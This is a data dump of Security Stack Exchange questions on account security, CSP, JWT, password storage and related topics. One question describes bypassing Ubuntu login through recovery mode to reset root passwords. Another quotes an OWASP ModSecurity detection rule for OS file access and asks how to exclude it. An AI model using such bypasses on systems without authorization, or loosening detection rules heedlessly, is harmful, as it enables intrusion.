","84695","","19837","","2015-09-03 09:07:55","2015-09-03 09:07:55","Is it safe to keep a virus' binary code on your local machine?","<virus><file-upload><content-security-policy>","1","3","","","","CC BY-SA 3.0"
"234719","1","234725","","2020-07-15 18:00:09","","18","5022","<p>If I can change my password with cmd <code>net user example *</code> <strong>without</strong> needing to confirm my old password, why, when I change my password in the usual way (via settings or control panel), do I need to confirm my old password? If the point of confirming a password is to prevent somebody who finds the PC open from signing in, this circumvents it!</p>
","227786","","227786","","2020-07-19 10:52:38","2020-07-19 10:52:38","Why does Windows not always force me to confirm my password when changing it?","<passwords><account-security><windows-10><password-reset><cmd>","1","3","","","","CC BY-SA 4.0"
"234740","1","234757","","2020-07-16 12:43:25","","27","4092","<p>It seems common practice, when denying access to a user because of an incorrect email / password combination, to not specify which of the username or password was incorrect. This avoids leaking the information that an account does or doesn't exist with that email address.</p>
<p>For instance, if I try to log in with my spouse's email address on a dating website, and the error message is &quot;Incorrect password&quot; rather than &quot;There is no account with this email address&quot;, I can draw the necessary conclusions.</p>
<p>But how do I avoid that same information leak on an account creation form, where I must prevent a user from creating an account with an email adress that already has one?</p>
","143721","","143721","","2020-07-16 13:17:07","2020-07-16 20:26:13","On my website's account creation form, how to avoid leaking the information that an email address already has an account?","<account-security>","4","4","","2020-07-17 12:49:15","","CC BY-SA 4.0"
"234762","1","","","2020-07-17 00:28:26","","1","399","<p>Is it a bad practice to store my user's ObjectId in a JWT in the sub claim?
I could create an alternate UUID field in the user database and use this instead, but I wondered if I should?</p>
<p>I use this sub claim in both the refreshToken and accessToken.</p>
","238505","","","","","2020-07-17 00:28:26","Is it a bad practice to store my user's ObjectId in a JWT in the sub claim?","<account-security><jwt>","0","5","","","","CC BY-SA 4.0"
"99503","1","99521","","2015-09-04 02:17:33","","1","1337","<p>I have an overview ideas of the preventing ddos attacks, in a simple way. Please clarify me, if my thinking is wrong. </p>

<p><strong>Option 1</strong> </p>

<p>From the basic understanding of the DDOS attacks is that the attacker is sending a lot of data to the web server. So what about the website that offer big data uploading to their website? Aren't they not also receiving a lot of data at the same time from many uploading users? </p>

<p>Can't the web server treat the ddos attacks like a many users uploading data?</p>

<p><strong>Option 2</strong> </p>

<p>What about a website offer, everyone who visit the website temporary key? With that temporary key insert into the website, the only one (PC/IP) can access that website, so bot-net can't attack the website (bot-net doesn't have the temporary key).
Can bot-net note the key and insert into the website?</p>

<p>P.S.</p>

<p>This is the similar question
<a href=""https://security.stackexchange.com/questions/33811/ddos-impossible-to-stop"">DDoS - Impossible to stop?</a></p>
","5261","","-1","user45139","2017-03-17 13:21:41","2015-09-04 08:00:55","How to Stop DDoS Attacks by simple function on web server?","<webserver><attack-prevention><ddos><web-service><security-theater>","3","0","","","","CC BY-SA 3.0"
"234928","1","","","2020-07-21 05:49:15","","10","6925","<p>When I do online shopping where I use my credit card information to purchase, I clear the browser cache, cookies and only open that single site. After I am done, I again clear the cache, cookies and start with my regular browsing. I do this to ensure any other websites that I open on a new tab do not sneak into my credit card information. Is this even possible or just a myth?</p>
<p>So if I wish to open &quot;any&quot; site on a new tab while doing my online shopping, is it safe or do I have to clear cookies every time and open only one site?</p>
","110784","","71850","","2020-08-01 07:50:15","2020-08-01 07:50:15","How safe is opening any website on new browser tab?","<encryption><passwords><web-browser><account-security><data-leakage>","3","12","","","","CC BY-SA 4.0"
"25688","1","","","2012-12-20 05:25:01","","2","202","<p>I have meet people and even businesses that are against using the cloud for data  storage invoking  security risks. In the same time they seem perfectly fine using email services (usually from obscure ten-bucks-a-month web hosts that also serves their two page website) to transport most of this data.  </p>

<p>Is data passing mail-servers not at the same level of risk as the various cloud storage solutions (Dropbox, AWS, etc)?</p>
","10923","","","","","2012-12-20 14:48:07","Are mail-servers removed from security concerns in contrast with cloud storage?","<email><cloud-computing><storage><security-theater>","3","1","","","","CC BY-SA 3.0"
"99646","1","","","2015-09-06 00:28:34","","1","191","<p>Would it be possible to have a javascript observatory and stricter CSP (Content Security Policy) and implement it for the Tor Browser? A javascript observatory should work similar to EFF's SSL observatory, it should observe javascript and check if it is an exploit or XSS code and block it, instead of the allow all or nothing from domain X approach used by NoScript. NoScript XSS filter is flawed. NoScript offers no protection against trusted website servers that get hacked.</p>

<p>Tor Browser only implements a very limited set of Content Security Policy, it does not allow blocking XSS and other malicious javascripts using Content Security Policy rules like <code>script-src 'none'</code>.</p>

<p>Stricter sandboxing (for Windows), could prevent exploit code to access APIs that give access to username, computer name, MAC address, hostname, open connections to arbitrary IP addresses, etc. As clearly done by the FBI: <a href=""https://twitter.com/jonathanmayer/status/621100179345686528/photo/1?ref_src=twsrc%5Etfw"" rel=""nofollow"">https://twitter.com/jonathanmayer/status/621100179345686528/photo/1?ref_src=twsrc%5Etfw</a></p>

<p><a href=""https://security.stackexchange.com/questions/40072/could-someone-explain-parts-of-the-fbis-firefox-0-day"">Could someone explain parts of the FBI&#39;s Firefox 0-day?</a></p>
","86145","","72313","user86146","2016-09-09 18:42:22","2016-09-09 18:42:22","Would it be possible to have a javascript observatory, stricter sandboxing and stricter CSP (Content Security Policy) for Tor?","<tor><content-security-policy>","2","2","","","","CC BY-SA 3.0"
"235118","1","235123","","2020-07-24 10:37:40","","0","122","<p>I was recently testing for Clickjacking and when I opened developer tools, I was warning</p>
<p><code>Content Security Policy: Ignoring “'unsafe-inline'” within script-src or style-src: nonce-source or hash-source specified</code></p>
<p>Do you guys think it is possible to bypass it, If yes can you share me the further information?</p>
<p><a href=""https://i.stack.imgur.com/yip0k.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yip0k.png"" alt=""enter image description here"" /></a></p>
<p>Thank You.</p>
","213455","","","","","2020-07-24 11:44:03","Error on Content Security Policy while testing for Clickjacking","<penetration-test><content-security-policy><clickjacking>","1","0","","","","CC BY-SA 4.0"
"235159","1","","","2020-07-25 09:39:45","","1","80","<p>I was once a customer of a certain developer who sold a <em>SaaS</em> bookkeeping software which allowed sending deal documents (invoice, receipt, etc) to a customer, from the software's very own email server, and any <strong>content</strong> sent was always digitally signed.</p>
<p>I know that in the context of emails, at least four &quot;aspects&quot; can be digitally signed:</p>
<ul>
<li>The email server itself</li>
<li>The timestamp of sending</li>
<li>The sending source (email address I would presume)</li>
<li>The <strong>content</strong> of an email sent (including attached files)</li>
</ul>
<h2>My questions</h2>
<ol>
<li>In the context of emails, what <strong>can</strong> be digitally signed (did I describe the aspects accurately and/or missed a certain aspect)?</li>
<li>What <strong>should</strong> be digitally signed in the sub context of deal documents (I know that some bookkeeping software don't allow digitally signing anything and I want to know why some do and some don't)</li>
</ol>
","239046","","239046","","2020-07-26 03:46:30","2020-07-26 03:46:30","In the context of emails, what can be digitally signed and what should be digitally signed in the sub context of deal documents?","<email><account-security><money>","0","1","","","","CC BY-SA 4.0"
"235204","1","","","2020-07-26 11:39:48","","2","86","<p>For an application with login and logout functionalities and browsing based upon authentication , what all do i need to secure it ?
I am basically very new to security and googling is leading to more confusion .</p>
<p>To start with i have decided to use JWT as the backbone . the client will log in , he/she gets a jws and the communication starts.
My First question is , do i also need to implement csrf protection for that ?
The way i see it , a malicious site or hacker will not be able to cause a csrf attack.
What else do i need to do to secure it more ?
I might have to save the token in a cookie using httpsecure. Will that be enough for the setup ?</p>
","239101","","","","","2020-07-26 12:21:48","What all security do i need to check to secure my application?","<account-security>","1","2","","2020-07-26 18:28:42","","CC BY-SA 4.0"
"235211","1","","","2020-07-26 13:43:53","","7","17332","<p>I woke up this morning to over 900 emails of several online services asking to confirm I’ve made an account. Last month my email had been compromised and they managed to get into my eBay and Amazon accounts. I managed to remedy the situation, and changed my passwords on everything. My password on my email is different from all my other accounts and is a fairly strong one. But today it seems to have been compromised again.</p>
<ol>
<li><p>How can I fix this so I stop getting signed up for accounts?</p>
</li>
<li><p>Is that email address far gone and I just need to get a new one?</p>
</li>
<li><p>How could this happen, so I can better prevent it in the future?</p>
</li>
<li><p>Could this somehow be related to my last breach, or is it just a coincidence?</p>
</li>
<li><p>What’s the point of breaching an email to sign up for hundreds of accounts in one night?</p>
</li>
</ol>
","239107","","6253","","2020-07-27 07:46:46","2023-07-28 14:33:34","I woke up and my email has been signed up to hundreds of online services. How can I fix this?","<email><account-security><breach>","3","3","","","","CC BY-SA 4.0"
"235249","1","","","2020-07-27 09:38:13","","1","235","<p>When I try to access some web site on firefox I get this:</p>
<p><a href=""https://i.stack.imgur.com/bieNw.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bieNw.png"" alt=""enter image description here"" /></a></p>
<p>The cut out rectangle is COMPANY-NAME-ROOT-CA and that issuer (COMPANY-NAME-ROOT-CA) was also added as trusted on some peoples PC.</p>
<p><strong>But when I visit same site using chrome I don't get such warning and certificate issuer seems to be legitimate (e.g. Let's Encrypt Authority X3). <strong>Does this mean I am safe to access this web site using chrome?</strong></strong></p>
<p>I know we had some reservations company could have set up MITM kind of thing, but I am curious if I am safe with Chrome since we don't get above warning on chrome.</p>
","239152","","-1","","2020-07-28 15:19:50","2020-07-28 15:19:50","Different certificate issuers on same site based on browser","<tls><man-in-the-middle><account-security>","0","4","","","","CC BY-SA 4.0"
"100093","1","","","2015-09-11 23:47:56","","6","1156","<p>HSTS allows me to force clients to connect to my website using HTTPS, but it doesn't specify the version of SSL, TLS, or what ciphers I'm prohibiting.</p>

<p>Is there any HSTS alternative or extension that allows me to specify </p>

<ul>
<li>TLS minimum version (1.2)</li>
<li>TLS Ciphers (those listed in TLS 1.3) </li>
</ul>
","396","","","user10211","2015-09-12 14:06:50","2015-09-13 15:36:20","Is there a HSTS equivalent for specifying TLS version?","<tls><threat-mitigation><hsts><content-security-policy>","2","1","","","","CC BY-SA 3.0"
"235316","1","","","2020-07-28 15:28:12","","1","105","<p><a href=""https://www.snowflake.com/"" rel=""nofollow noreferrer"">Snowflake</a> is a cloud database like <a href=""https://cloud.google.com/bigquery/"" rel=""nofollow noreferrer"">Google BigQuery</a> or <a href=""https://aws.amazon.com/redshift/"" rel=""nofollow noreferrer"">Amazon Redshift</a>. Unlike them, however, it markets a <a href=""https://www.snowflake.com/use-cases/modern-data-sharing/"" rel=""nofollow noreferrer"">&quot;Secure Data Sharing&quot;</a> feature.</p>
<p>They go to some effort (including a full <a href=""https://resources.snowflake.com/data-sharing/data-sharing-for-dummies%22"" rel=""nofollow noreferrer"">&quot;Data Sharing for Dummies&quot;</a> book) to position this as something unique. In terms of clearly defining who has access to what in a user-friendly way, maybe they are correct.</p>
<p>But does this add any extra security above simply <a href=""https://cloud.google.com/bigquery/docs/dataset-access-controls"" rel=""nofollow noreferrer"">sharing a BigQuery dataset</a> or <a href=""https://docs.aws.amazon.com/redshift/latest/dg/r_CREATE_USER.html"" rel=""nofollow noreferrer"">creating a read-only Redshift user</a>?</p>
","239228","","","","","2020-07-28 15:28:12","Does Snowflake Data Sharing add any real security?","<databases><cloud-computing><security-theater>","0","0","","","","CC BY-SA 4.0"
"167375","1","","","2017-08-13 01:25:53","","0","3755","<p>Can someone find out exactly what phone/phone number an email was sent from? Say Doug used sallys phone to sign in and check his gmail account but never signed out then sally opened his gmail and sent an email using his account.. is there a way to find out that that email did infact come from sallys phone and not Doug's? </p>
","156666","","","","","2017-08-15 00:21:29","Can someone find out what phone was used to send an email","<account-security><gmail><smartphone><tracking>","2","0","","","","CC BY-SA 3.0"
"235414","1","","","2020-07-30 08:57:44","","3","1508","<p>I'm building a checkout page for a website and have a checkout page with a content security policy (CSP).
When the customer pays with a card, they will see a box popup with the bank page that allows the bank to verify (if they want).</p>
<p>The problem I have is that the box that pops up is an iframe and I don't really want to allow all for frame-src in my CSP, I've currently allowed <a href=""http://www.securesuite.co.uk"" rel=""nofollow noreferrer"">www.securesuite.co.uk</a> but I'm guessing that's not the domain a German or French bank will use? Also I have a MasterCard but not a Visa or Maestro card and I don't have accounts for all the major banks they may all use different providers. My bank, Metrobank uses something like <a href=""http://www.securesuite.co.uk/metrobank/"" rel=""nofollow noreferrer"">www.securesuite.co.uk/metrobank/</a> other banks do something similar according to Google.</p>
<p>Eventually, my CSP reporting page would gather them all but each one would mean a failed transaction for each failing frame source.</p>
<p>Do all banks use <a href=""http://www.securesuite.co.uk"" rel=""nofollow noreferrer"">www.securesuite.co.uk</a>? Does anybody else have a list of the domain names that are used by 3D secure across different banks and card types? We are based in UK/Europe and customers are spread across Europe and will use cards from all sorts of banks.</p>
","239343","","6253","","2020-07-30 09:16:46","2021-01-18 15:55:08","3D secure 2 and CSP","<content-security-policy><payment>","1","0","","","","CC BY-SA 4.0"
"236491","1","251324","","2020-07-31 22:10:10","","1","672","<p>I've this error:</p>
<pre><code>ModSecurity: Warning. Matched &quot;Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `ARGS:scope' (Value: `email profile https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/useri (16 characters omitted)' ) [file &quot;/usr/local/owasp-modsecurity-crs-3.0.2/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf&quot;] [line &quot;84&quot;] [id &quot;930120&quot;] [rev &quot;4&quot;] [msg &quot;OS File Access Attempt&quot;] [data &quot;Matched Data: .profile found within ARGS:scope: email profile https:/www.googleapis.com/auth/userinfo.profile https:/www.googleapis.com/auth/userinfo.email openid&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;9&quot;] [accuracy &quot;9&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-lfi&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/FILE_INJECTION&quot;] [tag &quot;WASCTC/WASC-33&quot;] [tag &quot;OWASP_TOP_10/A4&quot;] [tag &quot;PCI/6.5.4&quot;] [hostname &quot;a.a.a.a&quot;] [uri &quot;/***/create_account_oauth.php&quot;] [unique_id &quot;159608684932.394214&quot;] [ref &quot;o53,8v144,116t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase&quot;
</code></pre>
<p>and I've created this exclusion rule for that:</p>
<pre><code>SecRule REQUEST_URI &quot;@beginsWith /***/create_account_oauth.php&quot; \
        &quot;phase:2,log,pass,id:19023,ctl:ruleRemoveById=930120&quot;
</code></pre>
<p>what I'd like to do is to refine the exclusion for googleapis only. I'm think chaining the rule with another one to match googleapis in the data field. Is that what you'd recommend? It seems difficult to find resource on chaining. Can someone please help? Thank you.</p>
","232327","","","","","2021-07-12 17:07:50","How to exclude rule 930120 for google oauth","<mod-security>","1","2","","","","CC BY-SA 4.0"
"167514","1","","","2017-08-15 05:45:26","","1","566","<p>I have deployed an opensource web Application named ""opencart"" it has simple password. My question is can attacker login my system and escalate privileges if he login web application and even know the password of mysql database.</p>
","110963","","","","","2017-08-15 08:45:30","Can attacker escalate its privileges if he has access a web Application running with www-data","<web-application><ubuntu><mod-security>","1","2","","2017-08-15 15:18:37","","CC BY-SA 3.0"
"167655","1","","","2017-08-16 22:01:28","","1","211","<p>Due to an ongoing discussion in my office, I was wondering if anyone had any comments on whether password hashing security needs to be very strong if client certificate validation is also required for account verification.</p>

<p>We use SHA-512 hashing with a randomized salt for password storage. It has been suggested that we don't need to iterate the hash function as we require BOTH password and a client certificate for user validation.</p>

<p>Is our account security significantly lower if we reduce the number of hash iterations taking into account we also require client certificate validation?</p>

<p>Since in some some cases we allow certificate-only validation, and in SOME cases (i.e. on developer machines) we allow password-only validation, I'm tempted to suggest that we allow a low number of iterations (or no extra iterations) of the hashing method for users that require client certificate validation, but require a normal number of hash iterations for users that don't. Does that make sense?</p>
","156976","","","","","2017-08-17 00:57:43","Do I need high password security if I also require a Client Certificate for validation?","<passwords><certificates><password-cracking><account-security>","1","1","","","","CC BY-SA 3.0"
"167727","1","167730","","2017-08-17 20:19:22","","2","229","<p>2 days ago some of the university staff asked me about 3 computers here.</p>

<p>All the computers are using Ubuntu and have the exact same password on the login screen for the superuser. Let's say <code>StackPa$$word</code> is the password. 3 computers refused the password.</p>

<p>Decided to hack and reset it. I've launched Ubuntu in recovery mode and I've selected <code>root</code> option in the recovery section. I've realized that it requested no password at all. Just entered command line as the <code>root</code> and I've typed <code>mount -o rw,remount /</code> followed by <code>passwd &lt;username&gt;</code>. It asked me for the new password and I've just entered it, and it accepted it.</p>

<p>Then I wanted to try it for the root, repeated the command as <code>passwd root</code> and it still worked. Now I've added a password of my choice to the root and also a password of my choice to the superuser.</p>

<p>Now I've full access to the computer and can use it for pretty much anything that I want to.</p>

<p>This concerns me way too much. Imagine 100~ computers are in the same situation. Also, if the user puts the password of their choice to the root and superuser, there's only one option, reinstalling the whole thing for that machine.</p>

<p>What do I do now? I wasn't working here before, so I noticed that when I started working. Should I just add passwd root to every single machine to ensure that no one will be able to access recovery terminal?</p>

<p>Also, let's say that I left the entire system like that. What could go wrong?</p>

<p>Please do enlighten me, thank you!</p>
","151372","","5400","","2017-08-17 20:21:08","2017-08-17 22:30:49","No password root accounts of an entire laboratory!","<password-management><account-security><ubuntu><recovery><root>","1","4","","","","CC BY-SA 3.0"
"236597","1","","","2020-08-03 20:42:03","","0","133","<p>We have a shared machine in the office, used for demo'ing our product.<br />
I want to be able to fetch the latest code from Github.<br />
We have 2FA enabled, so I can't use my login password for https operations.<br />
I can use a <a href=""https://docs.github.com/en/github/authenticating-to-github/accessing-github-using-two-factor-authentication#using-two-factor-authentication-with-the-command-line"" rel=""nofollow noreferrer"">Personal Access Token as the password</a>.</p>
<p>What is the best way to store this Personal Access Token on the shared machine, so that<br />
A) I can access it, but no one else can.
B) It's easy to get into the clipboard so that I can paste it into the password prompt?</p>
","26883","","","","","2020-08-03 21:20:08","How to store Personal Access Token securely on shared machine","<account-security><github>","1","0","","","","CC BY-SA 4.0"
"100336","1","100340","","2015-09-15 15:27:11","","4","1212","<p>I am beginner in Security. My first assignment is about ""Linux firewall using IPTABLES"" . I know about Ubuntu, backtrack and kali Linux.</p>

<p>How to choose a Linux distribution to learn about security?</p>
","86779","","32746","","2015-09-15 15:40:42","2015-09-16 08:58:53","How to choose a linux for learning?","<linux><kali-linux><security-theater><ubuntu>","3","7","","2015-09-15 20:44:26","","CC BY-SA 3.0"
"236804","1","","","2020-08-08 13:47:38","","0","452","<p>Our Product Manager wants a <strong>4 digit</strong> pin for login in our app, obviously for UX reasons, so user don't have to remember their password each time when they login.</p>
<p>A refresh token can be retrieved from backend to obtain a session token, which have access to the API. On our app, we encrypt the refresh token with <strong>AES and PBKDF2</strong>. A random salt and IV are generated plus the 4 digit used as password for PBKDF2.</p>
<p>After the encryption, I store the salt, IV and the cipher text base64 encoded in private shared preference.</p>
<p>The encryption code looks like this:</p>
<pre><code>const val CPR_TRANSFORMATION = &quot;AES/CBC/PKCS7Padding&quot;
const val ALGORITHM_TYPE = &quot;PBKDF2WithHmacSHA1&quot;
const val ITERATION_AMOUNT = 12000
const val KEY_SIZE = 256

private fun encrypt(passCode: String, data: ByteArray): Encrypted { //e.g.: passCode = &quot;0000&quot;
    val salt = ByteArray(256)
    SecureRandom().nextBytes(salt)

    val iv = ByteArray(16)
    SecureRandom().nextBytes(iv)

    val cipher = Cipher.getInstance(CPR_TRANSFORMATION)
    cipher.init(Cipher.ENCRYPT_MODE, getSecretKey(passCode, salt), IvParameterSpec(iv))
    val raw = cipher.doFinal(data)
    return Encrypted(salt.encodeBase64(), iv.encodeBase64(), raw.encodeBase64())
}

private fun getSecretKey(passCode: String, salt: ByteArray): Key {
    val pbKeySpec = PBEKeySpec(passCode.toCharArray(), salt, ITERATION_AMOUNT, KEY_SIZE)
    val keyBytes = SecretKeyFactory.getInstance(ALGORITHM_TYPE).generateSecret(pbKeySpec).encoded
    return SecretKeySpec(keyBytes, KeyProperties.KEY_ALGORITHM_AES)
}
</code></pre>
<h3>Now my question is: How secure is this implementation?</h3>
<ul>
<li>How could an attacker retrieve the refresh token from shared
preference and decrypt it?</li>
<li>Is the symmetric key inside secure element?</li>
<li>How safe is this implementation against malware or root?</li>
<li>How easy can the key be brute forced? (except that user tries 10k
times manually to insert the correct pin)</li>
</ul>
","240853","","","","","2020-08-08 13:47:38","Android: How safe is PBKDF2 with a 4 digit pin?","<encryption><android><account-security><pbkdf2>","0","2","","","","CC BY-SA 4.0"
"236825","1","","","2020-08-09 02:27:26","","0","374","<p>I would like to know if the following ideas are feasible:</p>
<p>Hash function is one-way function.</p>
<p>Generate public key from private key is irreversible(asymmetric cryptography).</p>
<p>User password entry -&gt; SHA(or adding salt before hashing) -&gt; hash value(as ECC private key) -&gt; generate public key from private key -&gt; save public key(drop private key)</p>
<p>Password authentication:</p>
<p>User password entry -&gt; SHA(or adding salt before hashing) -&gt; hash value(as ECC private key) -&gt; generate public key from private key -&gt; verify the public key with the saved one.</p>
<p>Based on that:</p>
<p>a.User or others can encrypt selected information(by using public key) that only user can decrypt it.</p>
<p>b.System administrator can generate a public/private key pair then both user and administrator can encrypt/decrypt selected information(by using Diffie–Hellman key exchange method).</p>
<p>I think that brute-force method(exhaustive attack method) can crack any password, and it is only a matter of time.It should be an another topic.</p>
<p>I am trying to prevent user information leak or rainbow table attack even if system being hacked.</p>
<p>I have searched and read the following information:</p>
<p><a href=""https://crypto.stackexchange.com/questions/9813/generate-elliptic-curve-private-key-from-user-passphrase"">https://crypto.stackexchange.com/questions/9813/generate-elliptic-curve-private-key-from-user-passphrase</a></p>
<p><a href=""https://security.stackexchange.com/questions/123785/handling-user-login-using-asymmetric-cryptography"">Handling user login using asymmetric cryptography</a></p>
<p><a href=""https://security.stackexchange.com/questions/138121/asymmetric-cryptography-as-hashing-function?newreg=c5dc7455ae714d739b7afd6dac75c1b3"">Asymmetric Cryptography as Hashing Function</a></p>
","240854","","","","","2020-10-14 22:54:58","Replace hashing function with asymmetric cryptography when password authentication","<encryption><authentication><passwords><cryptography><account-security>","2","5","","","","CC BY-SA 4.0"
"168044","1","","","2017-08-23 10:59:35","","3","242","<p>We are developing an website which serves end users of many organizations<br>
(banks  , municipalities etc).</p>

<p>We have already setup meetings with the banks and they've agreed to work with us.</p>

<p>Ok so let's say that a user <code>user1</code> of bank <code>bank1</code> is entering <code>bank1's</code> website - then he sees a legit certificate of <code>bank1</code> and a link for <code>newService1</code> -  : ""<em>For using the new service please click here</em>""</p>

<p>This way - <code>user1</code> can be sure that the new service is trusted by <code>bank1</code> since <code>bank1</code> showed the link to <code>user1</code>.</p>

<p><strong>Question</strong></p>

<p>But what about the scenario where <code>user1</code> has entered <code>newService1's</code> website directly and NOT via <code>bank1</code> ? How can I show the user that <code>newService1's</code> website is trusted via <code>bank1</code> ? </p>

<p>Sure I can create a link (in <code>newService1's</code> website) which says : ""This service is trusted by <code>bank1</code> - click here to see confirmation page in <code>bank1's</code> website"".</p>

<p>Are  there any other trust mechanism which  <code>newService1's</code> website can implement to show <code>user1</code> that <code>newService1's</code> is trusted by <code>bank1</code> ? </p>

<p>NB<br>
By <code>trust</code> I mean some kind of proof for <code>user1</code> that <code>bank1</code> has agreed to work with <code>newService1's</code>  .</p>
","5001","","5001","","2017-08-23 11:04:19","2017-12-22 12:49:20","How can we show our end-users that we are trusted by a bank?","<certificates><account-security><identification><identity-management>","1","3","","","","CC BY-SA 3.0"
"236894","1","","","2020-08-10 21:35:44","","17","12545","<p>There's a few questions here along these same lines already, but they're nearly a decade old. I'd like to know if things have changed, especially now that Chrome has become more aggressive about asking users to save their passwords, and those passwords being associated with a cloud account.</p>
<p>There's lots of rants against Chrome's current password saving policy, and lot's of articles warning against it. However, I don't know if I agree with them all.</p>
<p>Some obvious observations:</p>
<h2>Against</h2>
<ul>
<li>If someone gets physical access to your machine, there's only the OS password between them and every password you've ever saved.</li>
<li>Someone could potentially hack into your Google account, sign into Chrome, and also get access to all your passwords.</li>
<li>There's no &quot;master password&quot; (outside of your OS password) to protect them if someone should get logged in access to your computer.</li>
</ul>
<h2>For</h2>
<ul>
<li>According to <a href=""https://haveibeenpwned.com/"" rel=""noreferrer"">HaveIBeenPwned</a> I have had my email address and passwords shared online dozens of times thanks to hacks to websites. (Including big companies like Adobe, LinkedIn, Kickstarter, etc. and that's just the <em>known</em> hacks.) In that same time I've never had a computer stolen or been subject to a physical security breach.</li>
<li>If I use a uniquely generated password on every website, and save them into Chrome, no other websites accounts will be made vulnerable from another website security breach.</li>
<li>I probably trust Google to detect and protect me from unusual activity more than almost any other online service (which isn't to say they're infallible, obviously).</li>
</ul>
<p>In terms of attack vectors, it seems that if you feel you're more likely to be open to a physical attack (or attack from someone you know), then saving passwords into a browser could be a very bad idea.</p>
<p>However if you're more likely to be susceptible to remote attacks by strangers, then having unique passwords stored on every website is likely to improve your personal information's security. (In <em>any</em> case that would obviously be the ideal, but security has to factor in <strong>practicality</strong> - and the average user isn't going to remember a unique password for every website.)</p>
<p>(I wonder if a better solution to Chrome's current one (which allows users to reuse easily guessed passwords across websites) would be to force (or encourage) the user to only save unique and complex passwords?)</p>
<p>What are the pros and cons in real-life scenarios?</p>
","1662","","1662","","2021-06-03 17:11:37","2021-06-04 09:49:04","How safe is it to store your passwords in a modern browser?","<web-browser><password-management><account-security>","2","4","","","","CC BY-SA 4.0"
"236962","1","","","2020-08-12 04:44:31","","0","325","<p>We have a java application which allows users to upload attachments and save it on the server. The application has a content security policy defined like this:</p>
<pre><code>base-uri 'self'; child-src 'self'; form-action 'self'; frame-ancestors 'self'; connect-src 'self'; font-src 'self' https://fonts.gstatic.com; frame-src 'self'; img-src 'self' http://www.google-analytics.com https://www.google-analytics.com https://ssl.google-analytics.com data:; media-src 'self'; object-src 'self'; script-src 'unsafe-inline' 'unsafe-eval' 'self' http://www.google-analytics.com https://ssl.google-analytics.com; style-src 'unsafe-inline' 'unsafe-eval' 'self'; default-src ASTERISK;
</code></pre>
<p>Recently we got a CSP violation which is -</p>
<pre><code>&lt;CR&gt;csp-report:&lt;CR&gt; Referrer: &lt;CR&gt; Blocked Content Source: ms-appx-web://&lt;CR&gt; Violated Directive: font-src 'self' https://fonts.gstatic.com&lt;CR&gt; Effective Directive: font-src&lt;CR&gt; Status Code: 200&lt;CR&gt;
</code></pre>
<p>Can someone help me understand what is ms-appx-web and why did it come out to be the blocked content? Why does the CSP say that font-src is violated?</p>
<p>I have the below understanding -</p>
<p>Allowed fonts are the ones which are inside the application- &quot;SELF&quot; and from &quot;https://fonts-gstatic.com&quot; .. for some reason  the user tried to attach a pdf document having a font not supported by application/google fonts. That font may be defined in windows i.e. ms-appx-web://</p>
<p>Is the above correct?</p>
","130559","","130559","","2020-08-12 05:03:42","2023-06-12 14:01:40","CSP Violation ms-appx-web://","<web-application><web-browser><http><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"237043","1","","","2020-08-13 09:46:46","","0","72","<p>I'm using this Instagram account only on my 2nd phone which has no sim card and airplane mode always on. I use VPN 100% of the time when connecting to the internet. The account isn't linked with any Facebook account.</p>
<p>When I checked Instagram Setting &gt; Security &gt; Login Activity, it shows the VPN location. However, when looking at Setting &gt; Account &gt; About Your Account &gt; Account Based In, Instagram still shows that my account is based in my real location, not the VPN location.</p>
<p>How can Instagram detect this when I try every way to hide my real location?</p>
","241118","","6253","","2020-08-13 09:59:41","2020-08-13 09:59:41","How does Instagram know my location even if I use VPN and have no sim card?","<privacy><vpn><account-security><facebook><geolocation>","0","2","","2020-08-13 10:36:04","","CC BY-SA 4.0"
"168356","1","","","2017-08-28 18:35:13","","2","480","<p>The <a href=""https://www.wired.com/2012/11/ff-mat-honan-password-hacker/"" rel=""nofollow noreferrer"">Password Problem</a> has been <a href=""https://conversionxl.com/blog/password-ux/"" rel=""nofollow noreferrer"">spoken on many times</a>, but most places I've seen offer terrible solutions such as modifying a dictionary word, changing your password requirements to include special characters (or using dumb password complexity requirements <strong>at all</strong>), etc.</p>

<p>I'm thinking the temporary solution to the password problem from the user side will be to use an OSS, securely encrypted (community-checked) password manager such as KeePass, etc. (which exactly is <a href=""https://softwarerecs.stackexchange.com/questions/3802/enterprise-password-management-password-vault-software"">another question</a>), but is there a good article that recommends this to users and cites scholarly articles? I'm thinking something along the lines of:</p>

<ol>
<li>Install a password manager (here's how link) (Ref. to Academic paper with rationale)</li>
<li>machine- (or better yet <a href=""http://world.std.com/~reinhold/diceware.html"" rel=""nofollow noreferrer"">dice</a>-) generate your master password. (ref. to penetration testing of diceware-generated passwords)</li>
<li>setup 3 security levels in the generation profiles in your password manager, use the strongest (longest, highest entropy (Ref. to what entropy is)) when allowed.</li>
<li>For each site, check password <a href=""https://haveibeenpwned.com/Passwords"" rel=""nofollow noreferrer"">against dics</a>, turn on two-factor wherever possible, don't use ""security"" questions. (Refs)</li>
</ol>

<blockquote>
  <p>note: for the above, blogs, wikis, and other user-contributed sites are considered invalid citations. Actual academic journals are
  preferred, but official documentation sites are acceptable as well. The article I'm seeking can be a blog (but not Wikipedia), but the scholarly references it cites cannot.</p>
</blockquote>

<p>I'm primarily looking for an end-user-side article or post, though one that also includes a section educating website owners on the server-side of this problem (citing, for instance, <a href=""https://github.com/usnistgov/800-63-3"" rel=""nofollow noreferrer"">The NIST</a>) would be even better.</p>

<p>An article or page that is already written is preferred, but <em>iff</em> none exists, we will have to make an answer to this question the first one.</p>
","149193","","149193","","2017-08-30 15:44:09","2019-01-14 09:20:18","Is there a well-researched and user-friendly solution to the password problem?","<passwords><password-management><password-cracking><password-policy><account-security>","1","13","","2017-08-30 18:49:15","","CC BY-SA 3.0"
"237370","1","","","2020-08-21 04:32:29","","3","132","<p>Let's say we run a web app at &quot;example.org&quot;.  It uses cookies for user authentication.</p>
